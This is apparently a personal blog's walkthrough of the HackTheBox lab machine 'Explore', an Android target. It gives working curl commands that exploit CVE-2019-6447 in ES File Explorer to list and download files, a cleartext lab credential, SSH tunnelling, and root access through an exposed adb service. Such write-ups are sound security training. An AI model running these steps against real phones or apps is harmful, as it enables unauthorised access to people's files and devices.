+++
date = 2021-11-01T09:13:36+01:00
title = "HackTheBox - Explore"
description = "Writeup for HackTheBox's Explore."
slug = "explore"
author = "Bufu"
tags = ["android", "network", "cleartext credentials"]
categories = ["HackTheBox", "Android", "Easy"]
externalLink = ""
series = []
+++

![Explore Card Info](/images/writeups/htb-explore/explore.png)

- [user.txt](#usertxt)
  - [Nmap Scan](#nmap-scan)
  - [Accessing the File System through CVE-2019–6447](#accessing-the-file-system-through-cve-20196447)
  - [System Access over SSH](#system-access-over-ssh)
- [root.txt](#roottxt)
  - [Port Forwarding](#port-forwarding)
  - [Escalating to root via adb](#escalating-to-root-via-adb)

# user.txt

## Nmap Scan

We begin by adding the IP address of our machine to our hosts file. This way, we don't need to remember the actual IP address of our machine and can access it through our chosen hostname.

```bash
echo -e "10.129.249.96\texplore explore.htb" >> /etc/hosts
```

Next, we start an `nmap` scan of all ports on the target, which includes service and version detection, as well as default scripts.

```
# Nmap 7.91 scan initiated Mon Nov  1 09:20:21 2021 as: nmap -sCV -p- -T4 -oN scans/nmap.txt explore
Nmap scan report for explore (10.129.249.96)
Host is up (0.052s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
33367/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 08:20:42 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Mon, 01 Nov 2021 08:20:42 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Mon, 01 Nov 2021 08:20:47 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 08:21:02 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 08:20:47 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 08:21:02 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 08:21:02 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 08:21:02 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=11/1%Time=617FA35F%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33367-TCP:V=7.91%I=7%D=11/1%Time=617FA35E%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x20
SF:01\x20Nov\x202021\x2008:20:42\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Mon,\x2001\x20Nov\x202021\x2008:2
SF:0:42\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Mon,\x2001\x20Nov\x202021\x
SF:2008:20:47\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Mon,\x2001\x20Nov\x202021\x2008:20:47\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Mon,\x2001\x20Nov\x202021\x2008:21:02\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x2001\x20Nov\x
SF:202021\x2008:21:02\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x200
SF:1\x20Nov\x202021\x2008:21:02\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Mon,\x2001\x20Nov\x202021\x2008:21:02\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  1 09:22:21 2021 -- 1 IP address (1 host up) scanned in 120.26 seconds
```

## Accessing the File System through CVE-2019–6447

There are a number of interesting results from the `nmap` scan, such as an SSH server running on a non-standard port. What we are interesting in, however, is port `42135`, hosting a server named `ES File Explorer Name Response httpd`.

Further research reveals that the service actually creates an HTTP service bound to port `59777`, which initially showed up as a Minecraft server.

Looking for exploits also shows that there has been a CVE assigned, namely `CVE-2019-6447`.

There was a well written article on how to exploit this vulnerability manually, written by the Knownsec 404 Team, titled [Analysis of ES File Explorer Security Vulnerability (CVE-2019–6447)](https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566). The article shows the vulnerable version of the service: `4.1.9.7.4`.

We can then send a crafted `POST` request to execute the command `getDeviceInfo` on our target.

```bash
curl -X POST -H "Content-Type: application/json" -d '{"command":"getDeviceInfo"}' http://explore.htb:59777
```

![getDeviceInfo Results](/images/writeups/htb-explore/getdeviceinfo.png)

The output shows the FTP root directory and the port it is running on. There are more commands available to us, however.

| Command             | Description                                 |
| ------------------- | ------------------------------------------- |
| ``listFiles``       | List all files                              |
| ``listPics``        | List all pictures                           |
| ``listVideos``      | List all videos                             |
| ``listAudios``      | List all audio recordings                   |
| ``listApps``        | List installed applications                 |
| ``listAppsSystem``  | List system applications                    |
| ``ListAppsPhone``   | List commucation related applications       |
| ``listAppsSdcard``  | List applications installed on the SD cards |
| ``listAppsAll``     | List all applications                       |
| ``getAppThumbnail`` | List icons for the specified application    |
| ``appLaunch``       | Start the developed application             |
| ``appPull``         | Download an application from the device     |
| ``getDeviceInfo``   | Get system information                      |

We can then check for interesting files on the system. Checking for any pictures, reveals a file named `creds.jpg`, which hints at possible cleartext credentials.

```bash
curl -X POST -H "Content-Type: application/json" -d '{"command":"listPics"}' http://explore.htb:59777
```

![Possible credentials in pictures](/images/writeups/htb-explore/listpics.png)

From the blog post, we know that we can directory access and download files from the system using a `GET` request to its path. We can do this by using `wget`.

```bash
wget http://explore.htb:59777/storage/emulated/0/DCIM/creds.jpg
```

![creds.jpg](/images/writeups/htb-explore/creds.png)

It seems we got lucky and discovered cleartext credentials!

```
kristi:Kr1sT!5h@Rp3xPl0r3!
```

## System Access over SSH

The next step is to try if we can use these credentials somewhere. An obvious target here is the SSH server on port ``2222``.

```bash
ssh kristi@explore -p 2222
```

![SSH Access](/images/writeups/htb-explore/ssh.png)

And we can see that we could successfully connect! As this is an Android machine, I initially had some trouble finding `user.txt`, but I was able to locate it in the end.

```bash
/sdcard/user.txt
```

![user.txt]![SSH Access](/images/writeups/htb-explore/user.txt.png)

# root.txt

## Port Forwarding

Looking for possible privilege escalation vectors, we see that a service is listening on port ``5555`` on `localhost`.

```bash
netstat -tlnp
```

![Listening Services](/images/writeups/htb-explore/netstat.png)

Researching the port in connection with the Android OS tells us that the service running is `adb`, the `Android Debug Bridge`.

Checking the permissions the service is running with, reveals that it is actually running with `root` privileges!

```bash
ps -ef | grep adb
```

![Process Permissions](/images/writeups/htb-explore/ps.png)

As the service is only listening on `localhost` on the target, we need to forward the port to our machine. Since we already have SSH access, we can use SSH tunneling.

```bash
ssh -L 5555:localhost:5555 kristi@explore -p 2222
```

## Escalating to root via adb

Before we start with exploitation, we need to install a required package, the `Android Debug Bridge`.

```bash
apt install -y adb
```

Next, we start the server in the background.

```bash
adb start-server
```

Now we can connect to the bridge.

```bash
adb connect localhost:5555
```

![adb Connecton](/images/writeups/htb-explore/adb_connect.png)

If we check for connected devices, we can see our target showing up.

```bash
adb devices
```

![adb Devices](/images/writeups/htb-explore/adb_devices.png)

As we are connected to the debug bridge, we can use it to open a shell.

```bash
adb -s localhost shell
```

![adb Shell](/images/writeups/htb-explore/adb_shell.png)

Escalating to `root` is trivial, as the service is running with root privileges. We can just switch to the ``root`` user and read the flag!

![Root](/images/writeups/htb-explore/root.png)
